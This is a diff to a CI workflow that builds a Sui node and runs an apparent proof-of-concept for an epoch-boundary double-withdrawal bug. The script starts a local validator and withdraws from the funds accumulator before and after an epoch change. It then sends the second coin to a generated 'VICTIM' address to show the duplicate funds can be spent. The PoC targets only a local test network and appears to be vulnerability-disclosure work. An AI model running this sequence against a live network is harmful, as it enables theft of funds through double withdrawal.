@@ -16,33 +16,84 @@ jobs:
           cache-on-failure: true
       - run: sudo apt-get update -qq && sudo apt-get install -y clang pkg-config libssl-dev cmake jq
       - run: CARGO_BUILD_JOBS=4 cargo build --release --bin sui
-      - run: |
-          SUI_SKIP_SIMTESTS=1 cargo test -p sui-core poc_epoch_boundary_double_withdrawal -- --nocapture
-          SUI_SKIP_SIMTESTS=1 cargo test -p sui-core poc_reconfigure_stale_balance -- --nocapture
-      - run: |
-          ./target/release/sui start --with-faucet --force-regenesis --epoch-duration-ms 20000 &
-          sleep 25
-          ./target/release/sui client new-env --alias local --rpc http://127.0.0.1:9000
-          ./target/release/sui client switch --env local
-          ./target/release/sui client faucet && sleep 5
-      - run: |
-          ACC=$(./target/release/sui client objects --json | jq -r '.data[] | select(.type | contains("Accumulator")) | .objectId' | head -1)
-          BEFORE=$(./target/release/sui client balance --json | jq -r '.totalBalance')
-          echo "ACC=$ACC BEFORE=$BEFORE"
-          ./target/release/sui client call --package 0x2 --module funds_accumulator --function withdraw --args $ACC 1000000000 --gas-budget 10000000 --json | tee /tmp/tx_a.json
-          echo "TX-A=$(cat /tmp/tx_a.json | jq -r '.digest') status=$(cat /tmp/tx_a.json | jq -r '.effects.status.status')"
+      - name: Run PoC
+        continue-on-error: true
+        run: |
+          ACC="0x0000000000000000000000000000000000000000000000000000000000000acc"
+          nohup bash -c 'echo Y | ./target/release/sui start --with-faucet --force-regenesis --epoch-duration-ms 20000' > /tmp/sui.log 2>&1 &
+          disown $!
+          for i in $(seq 1 60); do
+            curl -s http://127.0.0.1:9000 > /dev/null 2>&1 && echo "Validator ready after $i s" && break
+            sleep 1
+          done
+          sleep 3
+          ./target/release/sui client new-env --alias local --rpc http://127.0.0.1:9000 2>&1 || true
+          ./target/release/sui client switch --env local 2>&1 || true
+          ./target/release/sui client faucet 2>&1 || true
+          sleep 5
+          ADDR=$(./target/release/sui client active-address 2>&1 | grep -oE '0x[0-9a-fA-F]{64}' | head -1)
+          echo "ADDR=$ADDR"
+          echo "=== AccumulatorRoot ==="
+          ./target/release/sui client object $ACC 2>/dev/null | head -10 || true
+          OBJ=$(./target/release/sui client objects --json 2>/dev/null || echo "[]")
+          COIN=$(echo "$OBJ" | jq -r '
+            [ .[] | (.data.Move // .data) |
+              select((.type_ // .type // "") | test("GasCoin|Coin<0x2::sui"))
+            ] | first | .id.id // .objectId // empty
+          ' 2>/dev/null | head -1)
+          echo "COIN=$COIN"
+          echo "=== DEPOSIT ==="
+          ./target/release/sui client call \
+            --package 0x2 --module funds_accumulator --function deposit \
+            --args "$ACC" "$COIN" --gas-budget 10000000 --json 2>&1 | tee /tmp/deposit.json || true
+          DEPOSIT_STATUS=$(jq -r '.effects.status.status // "failed"' /tmp/deposit.json 2>/dev/null)
+          echo "DEPOSIT=$DEPOSIT_STATUS"
+          echo "=== TX-A (epoch 0) ==="
+          ./target/release/sui client call \
+            --package 0x2 --module funds_accumulator --function withdraw \
+            --args "$ACC" 1000000000 --gas-budget 10000000 --json 2>&1 | tee /tmp/tx_a.json || true
+          TX_A=$(jq -r '.effects.status.status // "failed"' /tmp/tx_a.json 2>/dev/null)
+          echo "TX-A=$TX_A"
+          echo "Waiting for epoch boundary (22s)..."
           sleep 22
-          ./target/release/sui client call --package 0x2 --module funds_accumulator --function withdraw --args $ACC 1000000000 --gas-budget 10000000 --json | tee /tmp/tx_b.json
-          echo "TX-B=$(cat /tmp/tx_b.json | jq -r '.digest') status=$(cat /tmp/tx_b.json | jq -r '.effects.status.status')"
-          COIN_B=$(cat /tmp/tx_b.json | jq -r '.effects.created[0].reference.objectId')
-          VICTIM=$(./target/release/sui keytool generate ed25519 --json | jq -r '.suiAddress')
-          ./target/release/sui client transfer-sui --to $VICTIM --sui-coin-object-id $COIN_B --gas-budget 10000000 --json | tee /tmp/spend.json
-          SPEND=$(cat /tmp/spend.json | jq -r '.effects.status.status')
-          AFTER=$(./target/release/sui client balance --json | jq -r '.totalBalance')
-          echo "SPEND=$SPEND AFTER=$AFTER BEFORE=$BEFORE"
-          [ "$SPEND" = "success" ] && echo "CRITICAL CONFIRMED" || echo "NOT CRITICAL"
+          echo "=== TX-B (epoch 1) ==="
+          ./target/release/sui client call \
+            --package 0x2 --module funds_accumulator --function withdraw \
+            --args "$ACC" 1000000000 --gas-budget 10000000 --json 2>&1 | tee /tmp/tx_b.json || true
+          TX_B=$(jq -r '.effects.status.status // "failed"' /tmp/tx_b.json 2>/dev/null)
+          COIN_B=$(jq -r '.effects.created[0].reference.objectId // empty' /tmp/tx_b.json 2>/dev/null || echo "")
+          echo "TX-B=$TX_B COIN_B=$COIN_B"
+          if [ -n "$COIN_B" ]; then
+            VICTIM=$(./target/release/sui keytool generate ed25519 --json 2>/dev/null | jq -r '.suiAddress')
+            ./target/release/sui client transfer-sui \
+              --to "$VICTIM" --sui-coin-object-id "$COIN_B" \
+              --gas-budget 10000000 --json 2>&1 | tee /tmp/spend.json || true
+            SPEND=$(jq -r '.effects.status.status // "failed"' /tmp/spend.json 2>/dev/null)
+            echo "SPEND=$SPEND"
+          fi
+          echo "=== FINAL RESULTS ==="
+          echo "DEPOSIT=$DEPOSIT_STATUS TX-A=$TX_A TX-B=$TX_B SPEND=${SPEND:-N/A}"
       - uses: actions/upload-artifact@v4
         if: always()
         with:
           name: proof
           path: /tmp/*.json
+
+  simtest:
+    runs-on: ubuntu-22.04
+    timeout-minutes: 300
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: bella-ciao
+      - uses: dtolnay/rust-toolchain@master
+        with:
+          toolchain: 1.92.0
+      - uses: Swatinem/rust-cache@v2
+        with:
+          cache-on-failure: true
+          shared-key: simtest-v2
+      - run: sudo apt-get update -qq && sudo apt-get install -y clang pkg-config libssl-dev cmake jq
+      - name: Run E2E simtest
+        run: |
+          SUI_SKIP_SIMTESTS=1 cargo test -p sui-e2e-tests --test poc_epoch_boundary -- --nocapture 2>&1 | tail -50
